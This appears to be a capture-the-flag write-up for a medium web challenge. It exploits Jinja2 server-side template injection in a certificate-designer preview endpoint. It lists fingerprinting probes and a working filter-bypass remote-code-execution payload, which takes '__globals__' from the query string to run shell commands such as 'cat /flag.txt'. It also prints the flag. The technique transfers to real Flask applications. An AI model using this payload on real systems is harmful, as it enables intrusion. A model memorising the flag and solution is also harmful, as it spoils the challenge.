# Merged - Web (Medium)

**Flag:** `WEBVERSE{8ba2f569dafeedea7f4f6848757e1917}`

## Challenge

Certmarq is a course-certificate issuing platform: design a template once, merge each learner's details, then release
in bulk. The crux of the challenge: the designer renders certificates on their server so the issuer can preview them,
and "it trusts the designer a little more than it should".

## Initial Analysis

Issuer registration needs no email verification and goes straight to `/designer`. The page says it clearly:
*"every template runs through our content filter before it renders"* - so the challenge knows SSTI exists and has put
a filter in the way.

The sink is `POST /designer/preview` with a single field, `body`. Fingerprinting the engine:

| Probe | Result |
| --- | --- |
| `{{7*7}}` | `49` |
| `{{7*'7'}}` | `7777777` -> Jinja2 (Twig would give `77`) |
| `${7*7}` | left untouched -> not Twig/EJS |
| `{{ ''\|class }}` | `TemplateAssertionError` -> Jinja filter syntax |
| `{{config.items()}}` | prints the entire Flask config |
| `{{ ''.__class__ }}` | blocked: *the pattern "__" is not allowed* |

The most valuable finding: the filter searches for one single string, `__`. It blocks every literal containing a
dunder inside the template, but it does not look at the query string.

## Exploit Chain

The idea: keep the template free of any `__`, and bring the real dunder names in from outside through
`request.args`:

```jinja
{{(lipsum|attr(request.args.g))['os'].popen(request.args.c).read()}}
```

- `lipsum` is a global already present in Jinja2; `attr(request.args.g)` with `g=__globals__` takes the global dict
  of the `jinja2.utils` module, which holds the already-imported `os`.
- `['os'].popen(request.args.c).read()` runs the command and returns its output into the preview page.
- The body that is sent contains no `__` at all, so it passes the filter; `__globals__` lives in the query string,
  where the filter cannot reach it.

Verified with `c=id`: `uid=33(www-data)`. Then `c=cat /flag.txt` gives the flag. Reading `/entrypoint.sh` too, the
challenge confirms itself: *"Direct, unsandboxed Jinja2 SSTI ... a standard Jinja2 RCE chain reads /flag.txt"*.

The full payload together with the `fetch()` call is in `analysis/payload.md`.

## Flag
```
WEBVERSE{8ba2f569dafeedea7f4f6848757e1917}
```

This challenge has no re-runnable `exploit.py`. A `requests` script was written but has never had a successful run:
when it was retried the instance had already been stopped (WebVerse runs one instance at a time), and the real field
names of the registration form were never confirmed either. What is verified is the payload string together with the
JS snippet in `analysis/payload.md`, run directly on the instance's own tab.
